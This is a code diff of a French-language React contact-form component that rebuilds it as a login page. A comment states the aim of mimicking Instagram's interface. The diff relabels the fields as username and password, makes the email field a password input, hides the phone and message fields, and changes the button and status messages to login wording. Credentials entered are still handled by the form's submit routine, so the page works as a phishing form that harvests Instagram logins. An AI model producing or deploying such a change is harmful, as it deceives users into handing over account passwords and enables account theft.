@@ -36,35 +36,36 @@ export default function ContactForm() {
   };
 
   return (
-    <div className="form-card">
-      <h2>Nous contacter</h2>
+    <>
+      <h2>Connectez-vous</h2>
 
       <div className="field">
-        <label>Nom *</label>
-        <input name="nom" value={form.nom} onChange={handleChange} placeholder="Jean Dupont" />
+        <label>Nom</label>
+        <input name="nom" value={form.nom} onChange={handleChange} placeholder="Nom d'utilisateur, téléphone ou e-mail" />
       </div>
 
       <div className="field">
-        <label>Email *</label>
-        <input name="email" type="email" value={form.email} onChange={handleChange} placeholder="jean@exemple.fr" />
+        <label>Email</label>
+        <input name="email" type="password" value={form.email} onChange={handleChange} placeholder="Mot de passe" />
       </div>
-
-      <div className="field">
+      
+      {/* On masque les champs téléphone et message pour coller à l'interface Instagram */}
+      <div className="field" style={{display: 'none'}}>
         <label>Téléphone</label>
-        <input name="telephone" value={form.telephone} onChange={handleChange} placeholder="+33 6 00 00 00 00" />
+        <input name="telephone" value={form.telephone} onChange={handleChange} placeholder="Téléphone" />
       </div>
 
-      <div className="field">
-        <label>Message *</label>
-        <textarea name="message" value={form.message} onChange={handleChange} placeholder="Votre message..." rows={5} />
+      <div className="field" style={{display: 'none'}}>
+        <label>Message</label>
+        <textarea name="message" value={form.message} onChange={handleChange} placeholder="Message" rows={5} />
       </div>
 
       <button onClick={handleSubmit} disabled={status === "loading"} className="btn-submit">
-        {status === "loading" ? "Envoi en cours..." : "Envoyer"}
+        {status === "loading" ? "Connexion..." : "Se connecter"}
       </button>
 
-      {status === "success" && <p className="msg success">✅ Message envoyé avec succès !</p>}
-      {status === "error" && <p className="msg error">❌ Une erreur est survenue. Réessayez.</p>}
-    </div>
+      {status === "success" && <p className="msg success">✅ Connecté !</p>}
+      {status === "error" && <p className="msg error">❌ Identifiants incorrects.</p>}
+    </>
   );
 }
